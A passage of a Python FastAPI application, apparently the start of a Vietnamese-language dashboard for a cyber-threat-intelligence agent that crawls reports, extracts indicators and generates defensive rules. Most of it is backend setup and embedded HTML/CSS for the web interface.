# -*- coding: utf-8 -*-
"""
HỆ THỐNG AUTONOMOUS CTI AI AGENT — TERMINAL CLI (TMUX / BASH MAINFRAME EDITION)
Chạy tại: http://127.0.0.1:8765
Thiết kế:
- Phong cách Terminal CLI (Cyber-Industrial / ZSH-BASH Shell / TMUX Panes):
  + Phosphor Black (#0a0a0a), Terminal Neon Green (#33ff00), Amber Warning (#ffb000),
    Dimmed Green Border (#1f521f), Critical Error Red (#ff3333).
  + Monospace Supremacy: 100% JetBrains Mono & Fira Code trên mọi thành phần.
  + Góc vuông tuyệt đối 0px, viền cửa sổ 1px solid/dashed kiểu tmux panes (+--- WINDOW TITLE ---+),
    nút bấm đóng ngoặc vuông [ INITIATE ] với hiệu ứng đảo màu (Inverted Video) khi hover/active,
    ô nhập liệu kiểu shell prompt (root@cti-agent:~$), con trỏ nhấp nháy █ và lớp phủ CRT Scanlines.
"""

from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
import json
from pathlib import Path
import re
import sqlite3
import sys
import threading
import time
from typing import Any, Dict, List, Optional

def _clean_refang_py(s: str) -> str:
    if not s:
        return ""
    res = s.replace("[.]", ".").replace("(.)", ".").replace("[:]", ":")
    res = re.sub(r"[\[\]\(\)\{\}]", "", res)
    return res.strip()

from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import uvicorn

import os

REPO_ROOT = Path(__file__).resolve().parents[1] / "ai-devsecops-agent"
SANDBOX_DIR = Path(__file__).resolve().parent
ROOT_PROJECT_DIR = Path(__file__).resolve().parents[1]

ACTIVE_TARGET_PROJECT = os.environ.get("CTI_TARGET_PROJECT", "")
for idx, arg in enumerate(sys.argv):
    if arg == "--target" and idx + 1 < len(sys.argv):
        ACTIVE_TARGET_PROJECT = sys.argv[idx + 1]
        break
    elif arg.startswith("--target="):
        ACTIVE_TARGET_PROJECT = arg.split("=", 1)[1]
        break

if not ACTIVE_TARGET_PROJECT:
    last_cfg = SANDBOX_DIR / "last_active_project.json"
    if last_cfg.exists():
        try:
            ld = json.loads(last_cfg.read_text(encoding="utf-8"))
            tp = ld.get("target_path")
            if tp and Path(tp).exists():
                ACTIVE_TARGET_PROJECT = str(Path(tp).resolve())
        except Exception:
            pass

if not ACTIVE_TARGET_PROJECT:
    cand_cti = Path("D:/mkhang/testCTI")
    if cand_cti.exists():
        ACTIVE_TARGET_PROJECT = str(cand_cti.resolve())
    else:
        sample_p = ROOT_PROJECT_DIR / "target_projects" / "My_Website"
        if sample_p.exists():
            ACTIVE_TARGET_PROJECT = str(sample_p)
        else:
            ACTIVE_TARGET_PROJECT = str(Path.cwd())
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))
if str(SANDBOX_DIR) not in sys.path:
    sys.path.insert(0, str(SANDBOX_DIR))

from shared.schemas import EnrichedIOC, ExtractedIOC
from src.security.enrichment_service import enrich_ioc, filter_high_risk_iocs
from src.security.stix_converter import export_stix_package

def init_project_registry_db():
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    if db_path.exists():
        try:
            with sqlite3.connect(db_path) as conn:
                conn.execute("""
                    CREATE TABLE IF NOT EXISTS project_defense_registry (
                        target_path TEXT PRIMARY KEY,
                        target_name TEXT,
                        scope_id TEXT,
                        scope_name TEXT,
                        skill_name TEXT,
                        article_id TEXT,
                        scan_interval_sec INTEGER DEFAULT 21600,
                        is_configured INTEGER DEFAULT 1,
                        configured_at TEXT,
                        updated_at TEXT
                    )
                """)
                conn.commit()
        except Exception:
            pass

def record_project_configuration(target_path: Path, scope_id: str, scope_name: str, skill_name: str, scan_interval_sec: int, article_id: str = ""):
    global ACTIVE_TARGET_PROJECT
    p = target_path.resolve()
    ACTIVE_TARGET_PROJECT = str(p)
    cfg_data = {
        "project_name": p.name,
        "project_path": str(p),
        "scope_id": scope_id,
        "scope_name": scope_name,
        "skill_name": skill_name,
        "article_id": article_id,
        "scan_interval_sec": int(scan_interval_sec),
        "configured_at": datetime.now().isoformat(),
        "status": "PROTECTED"
    }
    try:
        (p / ".cti_defense.json").write_text(json.dumps(cfg_data, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    try:
        (SANDBOX_DIR / "last_active_project.json").write_text(json.dumps(cfg_data, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass
    try:
        db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
        if db_path.exists():
            with sqlite3.connect(db_path) as conn:
                conn.execute("""
                    INSERT OR REPLACE INTO project_defense_registry 
                    (target_path, target_name, scope_id, scope_name, skill_name, article_id, scan_interval_sec, is_configured, configured_at, updated_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, 1, ?, ?)
                """, (
                    str(p),
                    p.name,
                    scope_id,
                    scope_name,
                    skill_name,
                    article_id,
                    int(scan_interval_sec),
                    cfg_data["configured_at"],
                    datetime.now().isoformat()
                ))
                conn.commit()
    except Exception:
        pass
    return cfg_data

init_project_registry_db()

from lam_automation_crawler import (
    add_custom_article_from_url_or_text,
    crawl_all_sources_and_archive,
    crawl_gap_catchup_archive,
    crawl_year_to_date_archive,
    delete_archived_article,
    get_archived_articles,
    get_cti_gap_status,
    get_database_overview_stats,
    save_ai_analysis_run_to_db,
    save_enriched_iocs_to_db,
    toggle_article_historical_status,
    update_article_analysis_status,
    _count_real_iocs,
)
from openclaw_firewall_bridge import (
    LocalFirewallBridge,
    MultiLayerDefenseSynthesizer,
    build_d3fend_recommendations,
    build_master_defense_matrix_from_db,
)
from phuc_core_ai_agent import (
    AIAgentSecurityGuard,
    MultiProviderLLMBrain,
    OpenClawAgentGateway,
    tool6_extract_iocs_hybrid,
    tool7_map_mitre_attack,
    tool8_generate_defensive_rules,
)
from live_defense_orchestrator import live_orchestrator
from system_hardware_detector import detect_hardware_profile, get_adaptive_system_profile

CURRENT_HARDWARE = detect_hardware_profile()

app = FastAPI(title="Tự động hóa quy trình CTI và Sinh quy tắc phòng thủ ứng dụng AI agent")


class TestWafRequest(BaseModel):
    attack_type: str = "sqli"


class AddArticleRequest(BaseModel):
    url: str = ""
    title: str = ""
    content: str = ""


class ArticleManageRequest(BaseModel):
    article_id: str


class UpdateArticleStatusRequest(BaseModel):
    article_id: str
    status: str = "completed"
    processing_time_sec: float = 0.0


class Step2Request(BaseModel):
    text: str
    model_name: str = "khang-qwen3"


class Step3Request(BaseModel):
    text: str
    iocs: List[Dict[str, Any]]
    model_name: str = "khang-qwen3"


class Step4GenerateRequest(BaseModel):
    title: str
    text: str
    malicious_iocs: List[Dict[str, Any]]
    model_name: str = "khang-qwen3"


class FirewallSyncRequest(BaseModel):
    action: str = "apply"
    malicious_iocs: List[Dict[str, Any]] = []


class ChatAgentRequest(BaseModel):
    message: str
    model_name: str = "khang-qwen3"
    history: List[Dict[str, str]] = []


class DaemonConfigRequest(BaseModel):
    auto_scan_enabled: Optional[bool] = None
    scan_interval_sec: Optional[int] = None
    auto_queue_enabled: Optional[bool] = None


class SuricataTestRequest(BaseModel):
    flow_type: str = "c2_flow"


class SysmonTestRequest(BaseModel):
    event_type: str = "web_shell_spawn"


class YaraScanRequest(BaseModel):
    target_hash: str = ""


HTML_PAGE = r"""<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AUTONOMOUS CTI — LOCAL AI AGENT</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-page: #f8fafc;
      --bg-card: #ffffff;
      --bg-subtle: #f1f5f9;
      --bg-input: #ffffff;
      --border-main: #e2e8f0;
      --border-dark: #cbd5e1;
      --border-focus: #3b82f6;
      --text-main: #0f172a;
      --text-muted: #64748b;
      --primary: #2563eb;
      --primary-hover: #1d4ed8;
      --primary-subtle: #eff6ff;
      --amber: #b45309;
      --amber-bg: #fffbeb;
      --amber-border: #fcd34d;
      --danger: #b91c1c;
      --danger-bg: #fef2f2;
      --danger-border: #fca5a5;
      --safe: #15803d;
      --safe-bg: #f0fdf4;
      --safe-border: #86efac;

      /* Backward compatibility */
      --green-main: #2563eb;
      --green-border: #cbd5e1;
      --green-dim: #e2e8f0;
      --bg-dark: #f8fafc;
      --bg-box: #ffffff;
      --gold: #2563eb;
      --gold-light: #3b82f6;
      --pewter: #64748b;
      --fg-secondary: #2563eb;
      --fg-primary: #0f172a;
      --fg-dim: #64748b;
      --fg-error: #b91c1c;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: var(--bg-page);
      color: var(--text-main);
      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      font-size: 14px;
      line-height: 1.5;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
    }

    code, pre, .mono {
      font-family: 'JetBrains Mono', Consolas, monospace;
    }

    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: var(--bg-page); }
    ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
    ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }

    /* ================= TOP NAVBAR ================= */
    .TopNav {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 28px;
      border-bottom: 1px solid var(--border-main);
      background: #ffffff;
      position: sticky;
      top: 0;
      z-index: 100;
      flex-wrap: wrap;
      gap: 14px;
      box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.04);
    }

    .NavBrand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 17px;
      font-weight: 700;
      color: var(--text-main);
      letter-spacing: -0.01em;
    }
    .NavBrandTag {
      font-size: 11px;
      font-weight: 600;
      padding: 2px 8px;
      background: var(--primary-subtle);
      color: var(--primary);
      border: 1px solid #bfdbfe;
      border-radius: 4px;
      letter-spacing: 0.04em;
      text-transform: uppercase;
    }

    .NavLinks {
      display: flex;
      align-items: center;
      gap: 6px;
      flex-wrap: wrap;
    }

    .NavLink {
      background: transparent;
      color: var(--text-muted);
      border: 1px solid transparent;
      padding: 6px 14px;
      font-size: 13.5px;
      font-weight: 500;
      cursor: pointer;
      border-radius: 6px;
      transition: all 0.15s ease;
    }
    .NavLink:hover {
      color: var(--text-main);
      background: var(--bg-subtle);
    }
    .NavLink.active {
      color: #ffffff !important;
      background: #2563eb !important;
      border: 1px solid #1d4ed8 !important;
      font-weight: 700 !important;
    }

    .NavRight {
      display: flex;
      align-items: center;
      gap: 10px;
      flex-wrap: wrap;
    }

    .CleanSelect, .CleanInput {
      background: var(--bg-input);
      color: var(--text-main);
      border: 1px solid var(--border-dark);
      padding: 7px 12px;
      font-size: 13.5px;
      border-radius: 6px;
      outline: none;
      transition: border-color 0.15s ease, box-shadow 0.15s ease;
    }
    .CleanSelect:focus, .CleanInput:focus {
      border-color: var(--border-focus);
      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
    }

    .CleanBtn {
      background: #ffffff;
      color: var(--text-main);
      border: 1px solid var(--border-dark);
      padding: 7px 16px;
      font-size: 13px;
      font-weight: 600;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.15s ease;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
    }
    .CleanBtn:hover {
      background: var(--bg-subtle);
      border-color: #94a3b8;
    }
    .CleanBtn.active {
      background: var(--primary);
      color: #ffffff;
      border-color: var(--primary);
    }
    .CleanBtn.btn-primary {
      background: var(--primary);
      color: #ffffff;
      border-color: var(--primary);
    }
    .CleanBtn.btn-primary:hover {
      background: var(--primary-hover);
    }
    .CleanBtn:disabled {
      opacity: 0.55;
      cursor: wait;
    }

    .BtnMiniProof {
      background: #ffffff;
      color: var(--text-muted);
      border: 1px solid var(--border-main);
      padding: 2px 9px;
      font-size: 11.5px;
      font-weight: 500;
      border-radius: 4px;
      cursor: pointer;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 4px;
      transition: all 0.15s ease;
    }
    .BtnMiniProof:hover {
      border-color: var(--primary);
      color: var(--primary);
      background: var(--primary-subtle);
    }

    /* ================= MAIN WRAPPER & STATUS BAR ================= */
    .MainWrap {
      max-width: 1220px;
      margin: 20px auto 48px;
      padding: 0 20px;
    }

    .StatusStrip {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 16px;
      margin-bottom: 22px;
      border: 1px solid var(--border-main);
      background: #ffffff;
      border-radius: 8px;
      font-size: 13px;
      color: var(--text-muted);
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
      flex-wrap: wrap;
      gap: 10px;
    }

    /* ================= CARD CONTAINER ================= */
    .CyberBox {
      position: relative;
      background: #ffffff;
      border: 1px solid var(--border-main);
      border-radius: 8px;
      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05), 0 1px 2px rgba(0, 0, 0, 0.03);
      padding: 24px 22px 20px;
      margin-bottom: 26px;
    }

    .BoxLegend {
      position: absolute;
      top: -12px;
      left: 18px;
      background: #ffffff;
      padding: 0 10px;
      color: var(--text-main);
      font-size: 13.5px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.04em;
      border: 1px solid var(--border-main);
      border-radius: 4px;
    }

    .FieldLabel {
      display: block;
      font-size: 11.5px;
      font-weight: 600;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.04em;
      margin-bottom: 6px;
    }

    /* ================= SECTION 1: 2-COLUMN NEWS & READER ================= */
    .ToolbarRow {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      margin-bottom: 14px;
      flex-wrap: wrap;
    }

    .SplitWorkspace {
      display: grid;
      grid-template-columns: 4.5fr 7.5fr;
      gap: 16px;
    }
    @media (max-width: 920px) {
      .SplitWorkspace { grid-template-columns: 1fr; }
    }

    .FeedColumn {
      background: var(--bg-subtle);
      border: 1px solid var(--border-main);
      border-radius: 6px;
      height: 400px;
      overflow-y: auto;
      padding: 8px;
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .FeedItem {
      padding: 11px 13px;
      border: 1px solid var(--border-main);
      background: #ffffff;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.15s ease;
    }
    .FeedItem:hover {
      border-color: #94a3b8;
    }
    .FeedItem.selected {
      border-color: var(--primary);
      background: #ffffff;
      box-shadow: inset 3px 0 0 var(--primary), 0 1px 3px rgba(37, 99, 235, 0.12);
    }
    .FeedMeta {
      display: flex;
      justify-content: space-between;
      font-size: 11.5px;
      color: var(--text-muted);
      margin-bottom: 4px;
    }
    .FeedSource {
      color: var(--primary);
      font-weight: 600;
    }
    .FeedTitle {
      font-size: 13px;
      font-weight: 500;
      color: var(--text-main);
      line-height: 1.45;
    }
    .FeedFootMeta {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 7px;
      font-size: 11px;
      color: var(--text-muted);
      border-top: 1px dashed var(--border-main);
      padding-top: 5px;
    }
    .BadgePending {
      background: #fef3c7;
      color: #b45309;
      border: 1px solid #fde68a;
      padding: 1px 6px;
      border-radius: 4px;
      font-size: 10.5px;
      font-weight: 600;
      letter-spacing: 0.02em;
    }
    .BadgeProcessing {
      background: #dbeafe;
      color: #1d4ed8;
      border: 1px solid #93c5fd;
      padding: 1px 6px;
      border-radius: 4px;
      font-size: 10.5px;
      font-weight: 600;
      letter-spacing: 0.02em;
      animation: pulseAnim 1.5s infinite;
    }
    .BadgeCompleted {
      background: #dcfce7;
      color: #15803d;
      border: 1px solid #86efac;
      padding: 1px 6px;
      border-radius: 4px;
      font-size: 10.5px;
      font-weight: 600;
      letter-spacing: 0.02em;
    }
    @keyframes pulseAnim {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.7; transform: scale(0.98); }
    }
    .LiveTickerBar {
      background: #ffffff;
      border: 1px solid var(--border-main);
      border-left: 4px solid var(--primary);
      border-radius: 6px;
      padding: 9px 14px;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 10px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.03);
    }
    .LivePulseDot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #16a34a;
      box-shadow: 0 0 0 3px rgba(22, 163, 74, 0.2);
      display: inline-block;
      animation: dotPulse 2s infinite;
      flex-shrink: 0;
    }
    @keyframes dotPulse {
      0%, 100% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.25); opacity: 0.65; }
    }

    .ReaderColumn {
      background: #ffffff;
      border: 1px solid var(--border-main);
      border-radius: 6px;
      height: 400px;
      display: flex;
      flex-direction: column;
    }
    .ReaderHeader {
      padding: 9px 14px;
      border-bottom: 1px solid var(--border-main);
      background: var(--bg-subtle);
      border-top-left-radius: 6px;
      border-top-right-radius: 6px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 12px;
      font-weight: 600;
      color: var(--text-muted);
      flex-wrap: wrap;
      gap: 8px;
    }
    .ReaderBody {
      padding: 14px 16px;
      overflow-y: auto;
      font-size: 13.5px;
      line-height: 1.7;
      color: var(--text-main);
      flex: 1;
    }

    .HlSentence {
      margin: 6px 0;
      padding: 8px 12px;
      background: var(--bg-subtle);
      border-left: 3px solid var(--primary);
      border-radius: 0 4px 4px 0;
    }

    .HlIp1, .HlIp2, .HlCve, .HlHash {
      padding: 1px 7px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      font-weight: 600;
      display: inline-block;
      margin: 1px 2px;
      border-radius: 4px;
    }
    .HlIp1 {
      background: var(--danger-bg);
      color: var(--danger);
      border: 1px solid var(--danger-border);
    }
    .HlIp2 {
      background: var(--safe-bg);
      color: var(--safe);
      border: 1px solid var(--safe-border);
    }
    .HlCve {
      background: var(--amber-bg);
      color: var(--amber);
      border: 1px solid var(--amber-border);
    }
    .HlHash {
      background: #f5f3ff;
      color: #7c3aed;
      border: 1px solid #ddd6fe;
    }

    .BtnIocJump {
      font-size: 11px;
      font-weight: 600;
      padding: 2px 7px;
      border: 1px solid #bfdbfe;
      background: #eff6ff;
      color: #0284c7;
      border-radius: 4px;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 3px;
      transition: all 0.15s ease;
      white-space: nowrap;
      margin-top: 3px;
    }
    .BtnIocJump:hover {
      background: #0284c7;
      color: #ffffff;
      border-color: #0284c7;
    }

    @keyframes flashPulse {
      0% { box-shadow: 0 0 0 0 rgba(2, 132, 199, 0.7); background: #fef08a !important; color: #854d0e !important; }
      50% { box-shadow: 0 0 0 8px rgba(2, 132, 199, 0); background: #fde047 !important; color: #713f12 !important; }
      100% { box-shadow: 0 0 0 0 rgba(2, 132, 199, 0); background: #fef9c3 !important; }
    }
    .flash-focus {
      animation: flashPulse 2s ease-in-out;
      outline: 2px solid #0284c7 !important;
      border-radius: 4px;
    }

    /* ================= SECTION 2: AI BRIEF & SCORE TABLE ================= */
    .AiBriefGrid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 14px;
      margin-bottom: 16px;
    }
    @media (max-width: 860px) {
      .AiBriefGrid { grid-template-columns: 1fr; }
    }

    .AiBriefBox {
      background: var(--bg-subtle);
      border: 1px solid var(--border-main);
      border-radius: 6px;
      padding: 12px 14px;
      font-size: 13px;
      color: var(--text-main);
      max-height: 130px;
      overflow-y: auto;
      white-space: pre-wrap;
      line-height: 1.55;
    }

    .TableWrap {
      max-height: 380px;
      overflow-y: auto;
      border: 1px solid var(--border-main);
      border-radius: 6px;
      background: #ffffff;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 13px;
    }
    th {
      position: sticky;
      top: 0;
      background: #f8fafc;
      color: var(--text-muted);
      font-size: 11.5px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.04em;
      padding: 10px 12px;
      text-align: left;
      border-bottom: 1px solid var(--border-main);
      z-index: 5;
    }
    td {
      padding: 9px 12px;
      border-bottom: 1px solid var(--border-main);
      vertical-align: middle;
      color: var(--text-main);
    }
    tr:hover td {
      background: #f8fafc;
    }

    .StatusBlock {
      display: inline-block;
      padding: 2px 8px;
      font-size: 11px;
      font-weight: 600;
      border: 1px solid var(--danger-border);
      color: var(--danger);
      background: var(--danger-bg);
      border-radius: 4px;
    }
    .StatusSafe {
      display: inline-block;
      padding: 2px 8px;
      font-size: 11px;
      font-weight: 600;
      border: 1px solid var(--safe-border);
      color: var(--safe);
      background: var(--safe-bg);
      border-radius: 4px;
    }

    /* ================= SECTION 3: DEFENSE TABS ================= */
    .DecoTabs {
      display: flex;
      gap: 6px;
      margin-bottom: 14px;
      flex-wrap: wrap;
    }
    .TabPanel { display: none; }
    .TabPanel.active { display: block; }

    pre {
      background: #f8fafc;
      color: var(--text-main);
      border: 1px solid var(--border-main);
      border-radius: 6px;
      padding: 14px 16px;
      font-size: 12.5px;
      line-height: 1.6;
      max-height: 340px;
      overflow: auto;
      white-space: pre-wrap;
    }

    /* ================= HISTORY & KNOWLEDGE BASE ================= */
    .HistoryStatsGrid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 12px;
      margin-bottom: 16px;
    }
    @media (max-width: 960px) {
      .HistoryStatsGrid { grid-template-columns: repeat(2, 1fr); }
    }
    .HistoryStatCard {
      background: var(--bg-subtle);
      border: 1px solid var(--border-main);
      border-radius: 6px;
      padding: 12px 14px;
    }
    .HistoryStatLabel {
      font-size: 11px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.04em;
      color: var(--text-muted);
      margin-bottom: 4px;
    }
    .HistoryStatValue {
      font-size: 17px;
      font-weight: 700;
      color: var(--text-main);
    }
    .HistoryStatSub {
      font-size: 11.5px;
      color: var(--text-muted);
      margin-top: 2px;
    }
    .BadgeOld {
      display: inline-block;
      padding: 2px 7px;
      font-size: 11px;
      font-weight: 600;
      border: 1px solid var(--amber-border);
      color: var(--amber);
      background: var(--amber-bg);
      border-radius: 4px;
      cursor: pointer;
    }
    .BadgeNew {
      display: inline-block;
      padding: 2px 7px;
      font-size: 11px;
      font-weight: 600;
      border: 1px solid var(--safe-border);
      color: var(--safe);
      background: var(--safe-bg);
      border-radius: 4px;
      cursor: pointer;
    }
    .IocChip {
      display: inline-block;
      padding: 1px 6px;
      margin: 2px 3px 2px 0;
      font-size: 11px;
      font-family: 'JetBrains Mono', monospace;
      border-radius: 3px;
      border: 1px solid var(--border-dark);
      background: #ffffff;
      color: var(--text-main);
    }
    .IocChip.ip { border-color: var(--danger-border); color: var(--danger); background: var(--danger-bg); }
    .IocChip.ip-internal { border-color: #cbd5e1; color: #475569; background: #f8fafc; }
    .IocChip.ip-safe { border-color: #a7f3d0; color: #065f46; background: #ecfdf5; }
    .IocChip.cve { border-color: var(--amber-border); color: var(--amber); background: var(--amber-bg); }
    .IocChip.dom { border-color: #bfdbfe; color: var(--primary); background: var(--primary-subtle); }
    .IocChip.hash { border-color: #d8b4fe; color: #7e22ce; background: #faf5ff; }

    .UnifiedScopeBanner {
      padding: 12px 16px;
      margin-bottom: 16px;
      border-radius: 6px;
      border: 1px solid #bfdbfe;
      background: #eff6ff;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 12px;
      box-shadow: 0 1px 3px rgba(37, 99, 235, 0.08);
    }
    .UnifiedScopeBanner.master {
      border-color: #cbd5e1;
      background: #f8fafc;
    }
    .ScopeTag {
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      padding: 3px 8px;
      border-radius: 4px;
      font-family: var(--font-mono);
      display: inline-block;
    }
    .ScopeTag.single {
      background: #2563eb;
      color: #ffffff;
    }
    .ScopeTag.master {
      background: #475569;
      color: #ffffff;
    }
    .IocTypeFilterBar {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
      margin-bottom: 12px;
    }
    .IocTypeFilterBtn {
      background: #ffffff;
      color: var(--text-main);
      border: 1px solid var(--border-dark);
      padding: 5px 12px;
      font-size: 12.5px;
      font-weight: 600;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.15s ease;
      display: inline-flex;
      align-items: center;
      gap: 4px;
    }
    .IocTypeFilterBtn:hover {
      background: var(--bg-subtle);
      border-color: #94a3b8;
    }
    .IocTypeFilterBtn.active {
      background: var(--primary);
      color: #ffffff;
      border-color: var(--primary);
    }
  
    /* ========================================================= */
    /* UNIFIED DASHBOARD: THANH DIEU HUONG VA HE THONG LUON SAN SANG */
    /* ========================================================= */
    .TopNav {
      display: flex !important;
      justify-content: space-between !important;
      align-items: center !important;
    }
    .NavLinks, .NavRight {
      display: flex !important;
    }
    .StatusStrip {
      display: flex !important;
    }
</style>

<!-- Clean Unified UI Mode -->


<style>
@keyframes spinSlow { to { transform: rotate(360deg); } }
.progress-pulse { animation: pulseAnim 1.5s infinite; }
@keyframes pulseAnim {
  0% { box-shadow: 0 0 0 0 rgba(37,99,235,0.4); }
  70% { box-shadow: 0 0 0 10px rgba(37,99,235,0); }
  100% { box-shadow: 0 0 0 0 rgba(37,99,235,0); }
}
</style>

</head>
<body class="app-ready">

  <!-- TOP NAVBAR -->
  <nav class="TopNav">
    <div class="NavBrand">
      <span>CTI DEFENSE AGENT</span>
      <span class="NavBrandTag">AUTONOMOUS</span>
    </div>

    <div class="NavLinks">
      <button class="NavLink active" onclick="switchView('sec-wizard', this)">5 Bước Tự Hành (Wizard)</button>
      <button class="NavLink" onclick="switchView('all', this)">Tất Cả</button>
      <button class="NavLink" onclick="switchView('sec-feed', this)">1. Nguồn Báo</button>
      <button class="NavLink" onclick="switchView('sec-history', this)">Lịch Sử Đã Học (<span id="navHistoryCount">0</span>)</button>
      <button class="NavLink" onclick="switchView('sec-score', this)">2. Bảng Điểm IOC</button>
      <button class="NavLink" onclick="switchView('sec-defense', this)">3. Kho Kỹ Năng Tác Tử (Agentic Skills)</button>
      <button class="NavLink" onclick="switchView('sec-chat', this)">Chat AI Agent</button>
      <button class="NavLink" onclick="switchView('sec-add', this)">+ Thêm Báo Mới</button>
    </div>

    <div class="NavRight">
      <select id="aiModelSelect" class="CleanSelect" onchange="onAiModelChange()">
        <option value="auto" selected>Đang dò tìm Model &amp; GPU cục bộ...</option>
      </select>
      <button class="CleanBtn btn-primary" id="btnRunAll" onclick="runPipeline()">
        Chạy Phân Tích
      </button>
      <button class="CleanBtn" style="border-color:#93c5fd; color:#0369a1; background:#f0f9ff; font-weight:600;" onclick="showCliControlModal()" title="Quản lý hệ thống qua CLI Terminal">
        CLI Controller
      </button>
    </div>
  </nav>

  <div class="MainWrap">

    <!-- KHUNG ĐIỀU HƯỚNG VÀ TRẠNG THÁI DỰ ÁN MỤC TIÊU -->
    <div id="projectContextContainer" style="margin-bottom:14px;"></div>

    <!-- THANH TRẠNG THÁI -->
    <div class="StatusStrip">
      <div>
        <b style="color:var(--primary);" id="localModelBadge">TỰ ĐỘNG NHẬN DIỆN PHẦN CỨNG...</b>
        <span style="margin:0 8px;">&bull;</span>
        <span id="statusText">Sẵn sàng phân tích.</span>
        <span id="liveTelemetryLine" style="display:none;"></span>
      </div>
      <div id="autoScanStripControls" style="display:none; align-items:center; gap:12px;">
        <label style="font-size:12.5px; cursor:pointer; display:flex; align-items:center; gap:6px;">
          <input type="checkbox" id="autoQueueToggle" onchange="toggleAutoQueueWorker()" />
          Tự động xử lý tuần tự (<span id="queueWorkerStatus" style="color:var(--text-muted); font-weight:600;">Tắt</span>)
        </label>
        <span style="color:var(--border-main);">&bull;</span>
        <label style="font-size:12.5px; cursor:pointer; display:flex; align-items:center; gap:6px;">
          <input type="checkbox" id="autoScanToggle" checked onchange="onAutoScanToggleChange(this.checked)" />
          Tự động quét ngầm:
        </label>
        <select class="CleanSelect" id="scanDelayInput" onchange="onScanDelayChange(this.value)" style="padding:2px 8px; font-size:12px; height:26px; border-color:var(--border-main);">
          <option value="120">Mỗi 2 phút (Demo)</option>
          <option value="300">Mỗi 5 phút</option>
          <option value="900">Mỗi 15 phút</option>
          <option value="3600">Mỗi 1 giờ</option>
          <option value="21600" selected>Mỗi 6 giờ (Chuẩn Web App)</option>
          <option value="43200">Mỗi 12 giờ</option>
          <option value="86400">Mỗi 24 giờ</option>
          <option value="259200">Mỗi 3 ngày (Endpoint)</option>
          <option value="604800">Mỗi 7 ngày (Hardware/IoT)</option>
        </select>
        <span class="mono" style="font-size:12px; color:var(--primary); font-weight:600;" id="countdownText">21600s</span>
        <span class="mono" style="color:var(--primary); font-weight:600;" id="progressPercentText">100%</span>
        <span style="color:var(--border-main);">&bull;</span>
        <button type="button" id="btnCatchUpGap" class="CleanBtn" style="padding:2px 10px; font-size:12px; height:26px; background:#fef3c7; color:#92400e; border:1px solid #fcd34d; border-radius:4px; font-weight:600; cursor:pointer; display:inline-flex; align-items:center; gap:5px;" onclick="triggerCatchUpCrawl()" title="Rà soát và cào bù toàn bộ bài báo mới được công bố trong khoảng thời gian tắt máy">
          <span id="gapIndicatorDot" style="width:7px; height:7px; border-radius:50%; background:#d97706; display:inline-block;"></span>
          <span id="gapCatchUpBtnText">Cào Bù Tình Báo (Khoảng Trống Tắt Máy)</span>
        </button>
      </div>
      <div id="autoScanPendingMsg" style="display:inline-flex; align-items:center; gap:6px; font-size:12.5px; color:#64748b; font-style:italic;">
        <span>Chờ kích hoạt bảo vệ dự án...</span>
      </div>
      <!-- Giữ ID ẩn cho tương thích JS -->
      <div style="display:none;">
        <span id="st1"></span><span id="st1Meta"></span>
        <span id="st2"></span><span id="st2Meta"></span>
